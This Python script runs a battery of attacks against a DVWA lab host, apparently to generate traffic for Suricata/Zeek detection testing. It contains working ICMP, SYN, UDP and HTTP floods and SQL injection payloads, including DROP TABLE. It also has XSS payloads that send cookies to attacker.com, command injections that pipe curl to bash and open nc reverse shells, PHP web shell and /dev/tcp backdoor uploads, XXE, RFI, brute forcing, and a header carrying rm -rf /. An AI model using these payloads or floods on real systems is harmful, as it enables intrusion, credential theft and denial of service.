import socket
import threading
import time
import random
import requests
from bs4 import BeautifulSoup
import itertools
import re
import urllib.parse

# ---------------------- Network Attacks ----------------------

def icmp_flood(target_ip, count=1000):  # Increased count for better detection
    print("[*] Starting ICMP Flood...")
    # Need root privileges for this to work
    try:
        # Use subprocess to call ping instead of raw sockets
        import subprocess
        for _ in range(count):
            subprocess.Popen(f"ping -c 1 -W 1 {target_ip}", shell=True, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[+] Sent ICMP packet to {target_ip}")
            time.sleep(0.01)  # Small delay to not overwhelm local system
    except Exception as e:
        print(f"[!] ICMP Error: {e}")

def syn_flood(target_ip, target_port, count=1000):  # Increased for better detection
    print("[*] Starting SYN Flood...")
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(0)  # Non-blocking
            # Just initiate the connection and move on (don't wait)
            sock.connect_ex((target_ip, target_port))
            print(f"[+] Attempted SYN to {target_ip}:{target_port}")
        except:
            pass  # Expected to fail, so ignore errors
        time.sleep(0.01)  # Small delay

def udp_flood(target_ip, count=100):
    print("[*] Starting UDP Flood...")
    for _ in range(count):
        try:
            port = random.randint(1, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, port))
            print(f"[+] Sent UDP packet to {target_ip}:{port}")
        except Exception as e:
            print(f"[!] UDP Error: {e}")

def http_get_flood(target_ip, target_port=80, count=100):  # Increased count
    print("[*] Starting HTTP GET Flood...")
    for i in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Add random query params and more headers
            random_param = f"?nocache={random.randint(1000000, 9999999)}"
            headers = (
                f"GET /{random_param} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Accept: text/html,application/xhtml+xml\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            sock.send(headers.encode())
            print(f"[+] Sent HTTP GET to {target_ip}")
            sock.close()
        except Exception as e:
            print(f"[!] HTTP GET Error: {e}")
        time.sleep(0.05)  # Small delay

# ---------------------- Web Attacks ----------------------

session = requests.Session()
base_url = "http://192.168.124.58/DVWA" 
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"
xss_url = f"{base_url}/vulnerabilities/xss_r/"
cmdi_url = f"{base_url}/vulnerabilities/exec/"
file_inc_url = f"{base_url}/vulnerabilities/fi/"  # File Inclusion URL
upload_url = f"{base_url}/vulnerabilities/upload/" # File Upload URL
brute_force_url = f"{base_url}/vulnerabilities/brute/" # Brute Force URL
csrf_url = f"{base_url}/vulnerabilities/csrf/" # CSRF URL

def login():
    print("[*] Logging into DVWA...")
    try:
        # Step 1: Get the login page to get the CSRF token
        r = session.get(login_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]


        # Step 2: Login with proper data
        data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": token
        }
        response = session.post(login_url, data=data)
        
        # Step 3: Verify login success
        if "Welcome to Damn Vulnerable Web Application!" in response.text:
            print("[\u2714] Login successful")
            
            # Step 4: Set security level to low for testing
            security_url = f"{base_url}/security.php"
            r = session.get(security_url)
            soup = BeautifulSoup(r.text, 'html.parser')
            token_input = soup.find("input", {"name": "user_token"})
            token_input = soup.find("input", {"name": "user_token"})
            if not token_input:
                print("[!] CSRF token not found.")
                return
            token = token_input["value"]

            
            data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": token
            }
            session.post(security_url, data=data)
            print("[\u2714] Security level set to low")
        else:
            print("[\u2718] Login failed")
    except Exception as e:
        print(f"[!] Login Error: {e}")

def sql_injection_attack():
    print("[*] Performing SQL Injection...")
    try:
        # Get the token first
        r = session.get(sqli_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        payloads = [
            "' OR '1'='1", 
            "1' OR 1=1 -- -", 
            "' UNION SELECT user,password FROM users -- -",
            "admin' --",
            "1' OR sleep(5) -- -",  # Time-based SQLi, highly detectable
            # Add more advanced SQL injection payloads that Suricata/Zeek can detect
            "1' UNION SELECT table_name,column_name FROM information_schema.columns -- -",
            "1'; DROP TABLE users; --",  # Attempt to drop table (Destructive)
            "1' UNION SELECT @@version,2 -- -",  # Database fingerprinting
            "1' OR BENCHMARK(5000000,MD5(1)) -- -"  # Heavy CPU operation, detectable
        ]
        
        for payload in payloads:
            params = {"id": payload, "Submit": "Submit", "user_token": token}
            r = session.post(sqli_url, data=params)
            if "Surname" in r.text or "admin" in r.text:
                print(f"[\u2714] SQLi succeeded: {payload}")
            else:
                print(f"[\u2718] SQLi failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] SQLi Error: {e}")

def xss_attack():
    print("[*] Performing XSS Attack...")
    try:
        # Get the token first
        r = session.get(xss_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<body onload='alert(\"XSS\")'>",
            "<svg/onload=alert(\"XSS\")>",
            "javascript:alert('XSS')",
            # Additional complex XSS payloads detectable by Suricata/Zeek
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<img src=\"x\" onerror=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9hdHRhY2tlci5jb20vc3RlYWwucGhwP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZQ=='))\">",
            "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
            "<script>var img=new Image(); img.src=\"http://attacker.com/\"+document.cookie;</script>",
            "<script>fetch('http://attacker.com/exfil?data='+document.cookie)</script>"
        ]
        
        for payload in payloads:
            params = {"name": payload, "Submit": "Submit", "user_token": token}
            r = session.post(xss_url, data=params)
            if payload in r.text:
                print(f"[\u2714] XSS succeeded: {payload}")
            else:
                print(f"[\u2718] XSS failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] XSS Error: {e}")

def command_injection_attack():
    print("[*] Performing Command Injection...")
    try:
        # Get the token first
        r = session.get(cmdi_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 && cat /etc/passwd",
            "127.0.0.1 | ls -la",
            "127.0.0.1; sleep 5",  # Timing attack, highly detectable
            "127.0.0.1;`id`",  # Backticks, highly detectable
            # Additional command injection payloads for better detection
            "127.0.0.1;curl http://evil.com/malware.sh | bash",
            "127.0.0.1;nc -e /bin/bash 10.0.0.1 4444",  # Reverse shell attempt
            "127.0.0.1;wget -O- http://attacker.com/backdoor.php > /var/www/html/backdoor.php",
            "127.0.0.1;echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
            "127.0.0.1$(curl http://attacker.com/exfil?$(whoami))" # Data exfiltration
        ]
        
        for payload in payloads:
            params = {"ip": payload, "Submit": "Submit", "user_token": token}
            r = session.post(cmdi_url, data=params)
            if "uid=" in r.text or "www-data" in r.text or "/bin/" in r.text:
                print(f"[\u2714] CMDi succeeded: {payload}")
            else:
                print(f"[\u2718] CMDi may have failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] CMDi Error: {e}")

# --- New Attack Functions ---

def path_traversal_attack():
    print("[*] Performing Path Traversal Attack...")
    try:
        # Get the token first
        r = session.get(file_inc_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        payloads = [
            "../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../boot.ini",
            "../../../../../../../../../../../etc/shadow",
            "file:///etc/passwd",
            "/var/log/apache2/access.log",
            "/proc/self/environ"
        ]
        
        for payload in payloads:
            params = {"page": payload, "Submit": "Submit", "user_token": token}
            r = session.get(file_inc_url, params=params)
            if "root:" in r.text or "boot loader" in r.text or "[fonts]" in r.text:
                print(f"[\u2714] Path Traversal succeeded: {payload}")
            else:
                print(f"[\u2718] Path Traversal may have failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] Path Traversal Error: {e}")

def remote_file_inclusion():
    print("[*] Performing Remote File Inclusion Attack...")
    try:
        # Get the token first
        r = session.get(file_inc_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        # RFI payloads pointing to remote servers
        # These should trigger Suricata/Zeek detection
        payloads = [
            "http://attacker.com/shell.txt",
            "http://attackerserver.com/malicious.php",
            "https://pastebin.com/raw/12345678",  # Example pastebin URL
            "http://attacker.com/shell.txt?",  # With URL parameter 
            "http://10.0.0.1/malware.php",
            "ftp://anonymous:anonymous@attackerserver.com/shell.php",
            "https://raw.githubusercontent.com/attacker/malicious/main/webshell.php"
        ]
        
        for payload in payloads:
            params = {"page": payload, "Submit": "Submit", "user_token": token}
            try:
                r = session.get(file_inc_url, params=params, timeout=3)
                print(f"[\u2714] RFI attempted: {payload}")
            except requests.exceptions.Timeout:
                print(f"[\u2714] RFI timeout (expected): {payload}")
            except Exception as e:
                print(f"[\u2718] RFI error: {payload} - {e}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] RFI Error: {e}")

def xxe_injection_attack():
    print("[*] Performing XXE Injection Attack...")
    try:
        headers = {'Content-Type': 'application/xml'}
        
        # XXE payloads that should trigger Suricata/Zeek
        xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [ <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <foo>&xxe;</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
               <foo>Triggered</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE data [
               <!ENTITY file SYSTEM "file:///etc/shadow">
               ]>
               <data>&file;</data>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE data [
               <!ENTITY % dtd SYSTEM "http://attackerserver.com/malicious.dtd">
               %dtd;
               ]>
               <data>Data</data>"""
        ]
        
        # Try XXE against any endpoints that might process XML
        endpoints = [f"{base_url}/vulnerabilities/upload/", f"{base_url}/api/"]
        
        for endpoint in endpoints:
            for payload in xxe_payloads:
                try:
                    r = session.post(endpoint, data=payload, headers=headers, timeout=3)
                    print(f"[\u2714] XXE injection attempted at {endpoint}")
                except:
                    print(f"[\u2718] XXE attempt failed at {endpoint}")
                time.sleep(1)
    except Exception as e:
        print(f"[!] XXE Injection Error: {e}")

def csrf_attack():
    print("[*] Performing CSRF Attack Simulation...")
    try:
        # Get the token first to see what we're working with
        r = session.get(csrf_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        # In CSRF we simulate an attacker creating a malicious form
        # and the victim submitting it without CSRF protection
        
        # Create simulated CSRF requests
        csrf_attacks = [
            # Password change attempt without proper token
            {"password_new": "hacked123", "password_conf": "hacked123", "Change": "Change"},
            
            # Attempt with invalid/missing CSRF token
            {"password_new": "hacked456", "password_conf": "hacked456", "Change": "Change", "user_token": "invalid_token"},
            
            # Attempt without any token
            {"password_new": "hacked789", "password_conf": "hacked789", "Change": "Change"}
        ]
        
        # Custom headers to make it look like the request is coming from elsewhere
        referrers = [
            "http://evil-site.com/csrf.html",
            "http://attacker.net/hack.php",
            "http://malicious.org/pwn.html"
        ]
        
        for i, payload in enumerate(csrf_attacks):
            headers = {
                "Referer": referrers[i % len(referrers)],
                "Origin": referrers[i % len(referrers)].split('/')[0] + '//' + referrers[i % len(referrers)].split('/')[2]
            }
            
            r = session.post(csrf_url, data=payload, headers=headers)
            print(f"[\u2714] CSRF attack attempted with referer: {headers['Referer']}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] CSRF Attack Error: {e}")

def brute_force_attack():
    print("[*] Performing Brute Force Attack...")
    try:
        # Common usernames and passwords for brute forcing
        usernames = ['admin', 'root', 'user', 'test', 'guest', 'administrator']
        passwords = ['password', '123456', 'admin', 'root', 'qwerty', 'letmein', 'welcome']
        
        # Get the token first
        r = session.get(brute_force_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        # Limit the number of attempts to avoid getting blocked/timeout
        attempt_count = 0
        max_attempts = 20  # Adjust based on how many attempts you want to simulate
        
        # Using itertools.product to generate combinations
        for username, password in itertools.product(usernames, passwords):
            if attempt_count >= max_attempts:
                break
                
            # Get fresh token for each request to simulate proper brute forcing
            try:
                r = session.get(brute_force_url)
                soup = BeautifulSoup(r.text, 'html.parser')
                token_input = soup.find("input", {"name": "user_token"})
                if not token_input:
                    print("[!] CSRF token not found.")
                    return
                token = token_input["value"]

                
                params = {
                    "username": username, 
                    "password": password, 
                    "Login": "Login",
                    "user_token": token
                }
                
                # Add some randomization to headers to appear more realistic
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                ]
                
                headers = {
                    "User-Agent": random.choice(user_agents)
                }
                
                r = session.post(brute_force_url, data=params, headers=headers)
                if "Welcome to the password protected area" in r.text:
                    print(f"[\u2714] Brute force succeeded: {username}:{password}")
                    break
                else:
                    print(f"[\u2718] Brute force attempt: {username}:{password}")
                
                attempt_count += 1
                time.sleep(0.5)  # Small delay between attempts
            except Exception as e:
                print(f"[!] Brute Force Request Error: {e}")
    except Exception as e:
        print(f"[!] Brute Force Attack Error: {e}")

def malicious_file_upload():
    print("[*] Performing Malicious File Upload Attack...")
    try:
        # Get the token first
        r = session.get(upload_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        if not token_input:
            print("[!] CSRF token not found.")
            return
        token = token_input["value"]

        
        # Malicious file content examples
        webshell_php = """
        <?php
        if(isset($_GET['cmd'])) {
            system($_GET['cmd']);
        }
        ?>
        """
        
        backdoor_php = """
        <?php
        $ip = '10.0.0.1'; // Attacker IP
        $port = 4444;     // Attacker Port
        $reverse_shell = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        system($reverse_shell);
        ?>
        """
        
        # Create files with malicious content
        malicious_files = [
            {"name": "simple_webshell.php", "content": webshell_php, "type": "application/x-php"},
            {"name": "backdoor.php.jpg", "content": backdoor_php, "type": "image/jpeg"}, # Bypass extension filters
            {"name": "evil.php5", "content": webshell_php, "type": "image/jpeg"},        # Alternative PHP extension
            {"name": "cmd.php%00.jpg", "content": webshell_php, "type": "image/jpeg"},   # Null byte injection
            {"name": "shell.phtml", "content": webshell_php, "type": "image/jpeg"}       # Alternative PHP extension
        ]
        
        for file_info in malicious_files:
            # Create a temporary file
            import tempfile
            with tempfile.NamedTemporaryFile(delete=False, suffix=file_info["name"].split('.')[-1]) as temp:
                temp.write(file_info["content"].encode())
                temp_path = temp.name
            
            # Upload the file
            with open(temp_path, 'rb') as f:
                files = {'uploaded': (file_info["name"], f, file_info["type"])}
                data = {'MAX_FILE_SIZE': '100000', 'user_token': token, 'Upload': 'Upload'}
                
                r = session.post(upload_url, files=files, data=data)
                if "succesfully uploaded!" in r.text:
                    print(f"[\u2714] File upload succeeded: {file_info['name']}")
                else:
                    print(f"[\u2718] File upload failed: {file_info['name']}")
            
            # Clean up the temporary file
            import os
            os.unlink(temp_path)
            time.sleep(1)
    except Exception as e:
        print(f"[!] File Upload Attack Error: {e}")

def user_agent_attacks():
    print("[*] Performing User-Agent based attacks...")
    try:
        # Malicious user agents that should trigger IDS alerts
        malicious_user_agents = [
            "sqlmap/1.4.7 (http://sqlmap.org)",
            "Nikto/2.1.6",
            "Nessus/8.10.1",
            "w3af/1.6.49",
            "masscan/1.0",
            "dirbuster/1.0",
            "ZmEu Scanner",
            "Mozilla/5.0 zgrab/0.x",
            "python-requests/trojan-downloader",
            "OWASP DirBuster"
        ]
        
        endpoints = [
            f"{base_url}/",
            f"{base_url}/login.php",
            f"{base_url}/vulnerabilities/"
        ]
        
        for user_agent in malicious_user_agents:
            headers = {"User-Agent": user_agent}
            for endpoint in endpoints:
                try:
                    r = session.get(endpoint, headers=headers)
                    print(f"[\u2714] User-Agent attack sent: {user_agent[:30]}... to {endpoint}")
                except Exception as e:
                    print(f"[\u2718] User-Agent request failed: {e}")
                time.sleep(0.5)
    except Exception as e:
        print(f"[!] User-Agent Attack Error: {e}")

def http_header_attacks():
    print("[*] Performing HTTP Header Injection/Attacks...")
    try:
        # Malicious headers that might trigger IDS
        malicious_headers = [
            {"X-Forwarded-For": "127.0.0.1' OR '1'='1"},
            {"X-Forwarded-For": "8.8.8.8; rm -rf /"},
            {"Referer": "' OR 1=1--"},
            {"X-Original-URL": "/admin/configuration"},
            {"X-Rewrite-URL": "../../../../etc/passwd"},
            {"Content-Length": "9999999999"},  # DoS attempt via large content length
            {"Connection": "keep-alive, X-Malicious: true"},
            {"Host": "localhost/; nc -e /bin/bash attacker.com 4444"},
            {"X-Remote-IP": "127.0.0.1; cat /etc/passwd"},
            {"X-Remote-Addr": "127.0.0.1' UNION SELECT 1,2,3,4,5--"}
        ]
        
        endpoints = [f"{base_url}/", f"{base_url}/login.php"]
        
        for header_dict in malicious_headers:
            for endpoint in endpoints:
                try:
                    r = session.get(endpoint, headers=header_dict)
                    print(f"[\u2714] Header attack sent: {list(header_dict.keys())[0]} to {endpoint}")
                except Exception as e:
                    print(f"[\u2718] Header attack failed: {e}")
                time.sleep(0.5)
    except Exception as e:
        print(f"[!] Header Attack Error: {e}")

# ---------------------- Main ----------------------

victim_ip = "192.168.124.58"

if __name__ == "__main__":
    # Set target information
    victim_ip = "192.168.124.58"  # Update with your target IP
    
    # Ask for confirmation before running attacks
    confirm = input(f"Run attacks against {victim_ip}? (y/n): ")
    if confirm.lower() != 'y':
        print("Exiting.")
        exit()
    
    # Network attacks - run in separate threads
    threads = []
    threads.append(threading.Thread(target=icmp_flood, args=(victim_ip,)))
    threads.append(threading.Thread(target=syn_flood, args=(victim_ip, 80)))
    threads.append(threading.Thread(target=udp_flood, args=(victim_ip,)))
    threads.append(threading.Thread(target=http_get_flood, args=(victim_ip,)))
    
    for thread in threads:
        thread.start()
    
    # Wait for network attacks to complete
    for thread in threads:
        thread.join(timeout=60)  # Wait up to 60 seconds
        
    # Web application attacks - these run sequentially
    print("\n[*] Starting web application attacks...")
    login()
    
    # Original attacks
    sql_injection_attack()
    xss_attack()
    command_injection_attack()
    
    # New attacks that are highly detectable by Suricata/Zeek
    path_traversal_attack()
    remote_file_inclusion()
    xxe_injection_attack()
    csrf_attack()
    brute_force_attack()
    malicious_file_upload()
    user_agent_attacks()
    http_header_attacks()
    
    print("\n[+] All attacks completed")